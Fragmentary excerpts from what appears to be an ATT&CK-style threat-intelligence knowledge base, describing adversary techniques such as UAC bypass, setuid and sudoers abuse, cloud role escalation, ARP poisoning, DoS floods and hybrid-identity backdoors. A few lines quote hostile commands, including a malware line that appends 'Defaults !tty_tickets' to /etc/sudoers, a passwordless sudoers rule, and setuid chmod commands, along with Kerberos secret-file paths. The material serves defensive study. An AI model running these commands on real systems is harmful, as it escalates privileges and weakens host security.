      "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.<sup>[[TechNet How UAC Works](https://app.tidalcyber.com/references/bbf8d1a3-115e-4bc8-be43-47ce3b295d45)]</sup>\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://app.tidalcyber.com/technique/8bc683db-1311-476f-8cae-45f3f89dcc66) objects without prompting the user through the UAC notification box.<sup>[[TechNet Inside UAC](https://app.tidalcyber.com/references/dea47af6-677a-4625-8664-adf0e6839c9f)]</sup><sup>[[MSDN COM Elevation](https://app.tidalcyber.com/references/898df7c7-4f19-40cb-a216-7b0f6c6155b3)]</sup> An example of this is use of [Rundll32](https://app.tidalcyber.com/technique/5652575d-cdb9-44ef-9c32-fff038f15444) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://app.tidalcyber.com/technique/8bc683db-1311-476f-8cae-45f3f89dcc66) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.<sup>[[Davidson Windows](https://app.tidalcyber.com/references/49af01f2-06c5-4b21-9882-901ad828ee28)]</sup>\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods<sup>[[Github UACMe](https://app.tidalcyber.com/references/7006d59d-3b61-4030-a680-5dac52133722)]</sup> that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.<sup>[[enigma0x3 Fileless UAC Bypass](https://app.tidalcyber.com/references/74b16ca4-9494-4f10-97c5-103a8521818f)]</sup><sup>[[Fortinet Fareit](https://app.tidalcyber.com/references/d06223d7-2d86-41c6-af23-50865a1810c0)]</sup>\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.<sup>[[SANS UAC Bypass](https://app.tidalcyber.com/references/824739ac-633a-40e0-bb01-2bfd43714d67)]</sup>",

However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://app.tidalcyber.com/technique/5c6687f6-3539-4268-a6a4-2b98fdeac0fb)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.<sup>[[OSX Keydnap malware](https://app.tidalcyber.com/references/d43e0dd1-0946-4f49-bcc7-3ef38445eac3)]</sup> This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\n\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://app.tidalcyber.com/technique/1492c4ba-c933-47b8-953d-6de3db8cfce8)).

      "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"<sup>[[sudo man page 2018](https://app.tidalcyber.com/references/659d4302-d4cf-41af-8007-aa1da0208aa0)]</sup> Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.<sup>[[OSX.Dok Malware](https://app.tidalcyber.com/references/71d65081-dada-4a69-94c5-f1d8e4e151c1)]</sup> Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.<sup>[[cybereason osx proton](https://app.tidalcyber.com/references/9c43d646-9ac2-43b5-80b6-9e69dcb57617)]</sup> In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",

      "description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.<sup>[[Google Cloud Just in Time Access 2023](https://app.tidalcyber.com/references/797c6051-9dff-531b-8438-d306bdf46720)]</sup><sup>[[Azure Just in Time Access 2023](https://app.tidalcyber.com/references/ee35e13f-ca39-5faf-81ae-230d33329a28)]</sup>\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account.<sup>[[Google Cloud Service Account Authentication Roles](https://app.tidalcyber.com/references/525a8afc-64e9-5cc3-9c56-95da9811da0d)]</sup> In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.<sup>[[Microsoft Impersonation and EWS in Exchange](https://app.tidalcyber.com/references/d7755dbd-0b38-5776-b63a-d792a4d027a4)]</sup> \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.<sup>[[AWS PassRole](https://app.tidalcyber.com/references/01e0c198-dd59-5dd1-b632-73cb316eafe0)]</sup><sup>[[Google Cloud Service Account Authentication Roles](https://app.tidalcyber.com/references/525a8afc-64e9-5cc3-9c56-95da9811da0d)]</sup>\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.<sup>[[Rhino Google Cloud Privilege Escalation](https://app.tidalcyber.com/references/55173e12-9edc-5685-ac0b-acd51617cc6e)]</sup><sup>[[Rhino Security Labs AWS Privilege Escalation](https://app.tidalcyber.com/references/693e5783-4aa1-40ce-8080-cec01c3e7b59)]</sup>\n\n**Note:** this technique is distinct from [Additional Cloud Roles](https://app.tidalcyber.com/technique/71867386-ddc2-4cdb-a0c9-7c27172c23c1), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources.

If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device.

A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.<sup>[[Arbor AnnualDoSreport Jan 2018](https://app.tidalcyber.com/references/cede4c72-718b-48c2-8a59-1f91555f6cf6)]</sup> With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed.

A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.<sup>[[Corero SYN-ACKflood](https://app.tidalcyber.com/references/ec41de8a-c673-41bf-b713-4a647b135532)]</sup>",

This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.<sup>[[Cloudflare HTTPflood](https://app.tidalcyber.com/references/1a5934a4-35ce-4f7c-be9c-c1faf4ee0838)]</sup>\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.<sup>[[Arbor SSLDoS April 2012](https://app.tidalcyber.com/references/b5de4376-0deb-45de-83a0-09df98480464)]</sup>",

Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes<sup>[[FireEye OpPoisonedHandover February 2016](https://app.tidalcyber.com/references/1d57b1c8-930b-4bcb-a51e-39020327cc5d)]</sup> and to support other malicious activities, including distraction<sup>[[FSISAC FraudNetDoS September 2012](https://app.tidalcyber.com/references/9c8772eb-6d1d-4742-a2db-a5e1006effaa)]</sup>, hacktivism, and extortion.<sup>[[Symantec DDoS October 2014](https://app.tidalcyber.com/references/878e0382-4191-4bca-8adc-c379b0d57ba8)]</sup>\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.<sup>[[USNYAG IranianBotnet March 2016](https://app.tidalcyber.com/references/69ee73c1-359f-4584-a6e7-75119d24bbf5)]</sup>\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.<sup>[[ArsTechnica Great Firewall of China](https://app.tidalcyber.com/references/1a08d58f-bf91-4345-aa4e-2906d3ef365a)]</sup>\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://app.tidalcyber.com/technique/e6c14a7b-1fb8-4557-83e7-7f5b89717311).\n",

User [Unix Shell](https://app.tidalcyber.com/technique/3eafcd8b-0cb8-4d23-8785-3f80a3c897c7)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells.

      "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://app.tidalcyber.com/technique/d4e46fe1-cc6d-4ef0-af72-a4e8dcd71381) and [Spearphishing Link](https://app.tidalcyber.com/technique/d08a9977-9fc2-46bb-84f9-dbb5187c426d). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://app.tidalcyber.com/technique/d4a36624-50cb-43d3-95af-a2e10878a533). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",

Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode.

To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  <sup>[[Sofacy Komplex Trojan](https://app.tidalcyber.com/references/a21be45e-26c3-446d-b336-b58d08df5749)]</sup> <sup>[[Antiquated Mac Malware](https://app.tidalcyber.com/references/165edb01-2681-45a3-b76b-4eb7dee5dab9)]</sup>.

Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://app.tidalcyber.com/technique/69cd62f8-b729-4a05-8351-5bb961f7c6d6), the search order differs depending on the method that is used to execute the program. <sup>[[Microsoft CreateProcess](https://app.tidalcyber.com/references/aa336e3a-464d-48ce-bebb-760b73764610)]</sup> <sup>[[Windows NT Command Shell](https://app.tidalcyber.com/references/aee1e76c-8ff2-4ff0-83e3-edcb76f34d19)]</sup> <sup>[[Microsoft WinExec](https://app.tidalcyber.com/references/9e1ae9ae-bafc-460a-891e-e75df01c96c4)]</sup> However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. <sup>[[Microsoft Environment Property](https://app.tidalcyber.com/references/64598969-864d-4bc7-805e-c289cccb7bc6)]</sup>\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://app.tidalcyber.com/technique/69cd62f8-b729-4a05-8351-5bb961f7c6d6).",

      "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD<sup>[[Azure AD Hybrid Identity](https://app.tidalcyber.com/references/b019406c-6e39-41a2-a8b4-97f8d6482147)]</sup>:\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.<sup>[[Azure AD Connect for Read Teamers](https://app.tidalcyber.com/references/0b9946ff-8c1c-4d93-8401-e1e4dd186305)]</sup><sup>[[AADInternals Azure AD On-Prem to Cloud](https://app.tidalcyber.com/references/7a6a7ecd-b9c7-4371-9924-34733597556c)]</sup> In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.<sup>[[MagicWeb](https://app.tidalcyber.com/references/5b728693-37e8-4100-ac82-b70945113e07)]</sup>\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud.

Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://app.tidalcyber.com/technique/b9d60848-388e-444c-9f22-2267ea61b5e9) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://app.tidalcyber.com/technique/8cf19b3d-c9fa-4d71-a6ab-dc0e236e57d4), authentication, via [Network Device Authentication](https://app.tidalcyber.com/technique/195aa08b-15fd-4019-b905-8f31bc5e2094), and perimeter defenses, via [Network Boundary Bridging](https://app.tidalcyber.com/technique/091282d8-ef05-487f-93aa-445efaeed71b).  Adding new capabilities for the adversary’s purpose include [Keylogging](https://app.tidalcyber.com/technique/7f1798b5-b159-441b-a5ef-3b5c706e1699), [Multi-hop Proxy](https://app.tidalcyber.com/technique/fa05c148-56a0-43ae-b8e4-2d4e91641400), and [Port Knocking](https://app.tidalcyber.com/technique/34a112db-c61d-4ea2-872f-de3fc1af87a3).\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://app.tidalcyber.com/technique/49e3504a-e031-45a0-b816-1d3741a78c7f), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://app.tidalcyber.com/technique/6f2186f3-c798-46e8-a26f-ae033822837b). \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit](https://app.tidalcyber.com/technique/b9d60848-388e-444c-9f22-2267ea61b5e9) to achieve persistence. ",

Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. <sup>[[Mandiant M Trends 2011](https://app.tidalcyber.com/references/563be052-29ac-4625-927d-84e475ef848e)]</sup>\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). <sup>[[GCN RSA June 2011](https://app.tidalcyber.com/references/40564d23-b9ae-4bb3-8dd1-d6b01163a32d)]</sup>\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate.

Likewise, one or more reflectors may be used to focus traffic on the target.<sup>[[Cloudflare ReflectionDoS May 2017](https://app.tidalcyber.com/references/a6914c13-f95f-4c30-a129-905ed43e3454)]</sup> This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS<sup>[[Cloudflare DNSamplficationDoS](https://app.tidalcyber.com/references/734cb2bb-462a-4bdc-9774-6883f99379b9)]</sup> and NTP<sup>[[Cloudflare NTPamplifciationDoS](https://app.tidalcyber.com/references/09ce093a-d378-4915-a35f-bf18a278d873)]</sup>, though the use of several others in the wild have been documented.<sup>[[Arbor AnnualDoSreport Jan 2018](https://app.tidalcyber.com/references/cede4c72-718b-48c2-8a59-1f91555f6cf6)]</sup>  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.<sup>[[Cloudflare Memcrashed Feb 2018](https://app.tidalcyber.com/references/a2a0c1eb-20ad-4c40-a8cd-1732fdde7e19)]</sup>",

      "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes<sup>[[FireEye OpPoisonedHandover February 2016](https://app.tidalcyber.com/references/1d57b1c8-930b-4bcb-a51e-39020327cc5d)]</sup> and to support other malicious activities, including distraction<sup>[[FSISAC FraudNetDoS September 2012](https://app.tidalcyber.com/references/9c8772eb-6d1d-4742-a2db-a5e1006effaa)]</sup>, hacktivism, and extortion.<sup>[[Symantec DDoS October 2014](https://app.tidalcyber.com/references/878e0382-4191-4bca-8adc-c379b0d57ba8)]</sup>\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://app.tidalcyber.com/technique/8b0caea0-602e-4117-8322-b125150f5c2a).",

Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.

This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.<sup>[[Module Stomping for Shellcode Injection](https://app.tidalcyber.com/references/0f9b58e2-2a81-4b79-aad6-b36a844cf1c6)]</sup> This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.<sup>[[Hiding Malicious Code with Module Stomping](https://app.tidalcyber.com/references/88983d22-980d-4442-858a-3b70ec485b94)]</sup> \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges.

If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).<sup>[[SSH Secure Shell](https://app.tidalcyber.com/references/ac5fc103-1946-488b-8af5-eda0636cbdd0)]</sup><sup>[[TechNet Remote Desktop Services](https://app.tidalcyber.com/references/b8fc1bdf-f602-4a9b-a51c-fa49e70f24cd)]</sup> They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. \n\nLegitimate applications (such as [Software Deployment Tools](https://app.tidalcyber.com/technique/1bcf9fb5-6848-44d9-b394-ffbd3c357058) and other administrative programs) may utilize [Remote Services](https://app.tidalcyber.com/technique/30ef3f13-5e9b-4712-9adf-f0da4ef157a1) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://app.tidalcyber.com/technique/af7afc1e-3374-4d1c-917b-c47c305274f5) to send the screen and control buffers and [SSH](https://app.tidalcyber.com/technique/7620ba3a-7877-4f87-90e3-588163ac0474) for secure file transfer.<sup>[[Remote Management MDM macOS](https://app.tidalcyber.com/references/e5f59848-7014-487d-9bae-bed81af1b72b)]</sup><sup>[[Kickstart Apple Remote Desktop commands](https://app.tidalcyber.com/references/f26542dd-aa61-4d2a-a05a-8f9674b49f82)]</sup><sup>[[Apple Remote Desktop Admin Guide 3.3](https://app.tidalcyber.com/references/c57c2bba-a398-4e68-b2a7-fddcf0740b61)]</sup> Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement.

By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read.

By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework.

